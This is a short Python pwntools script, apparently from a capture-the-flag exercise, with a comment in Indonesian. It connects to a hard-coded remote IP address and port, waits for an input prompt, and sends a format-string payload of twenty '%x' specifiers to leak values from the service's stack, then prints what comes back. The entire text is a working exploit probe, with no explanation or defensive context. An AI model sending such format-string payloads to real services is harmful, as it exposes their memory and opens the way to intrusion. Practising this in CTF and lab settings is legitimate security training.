from pwn import *

conn = remote("45.33.118.86", 9992)

payload = "%x " * 20  # coba leak 20 nilai di stack
conn.recvuntil("Enter your input: ")
conn.sendline(payload)
response = conn.recvall()
print(response.decode(errors="ignore"))
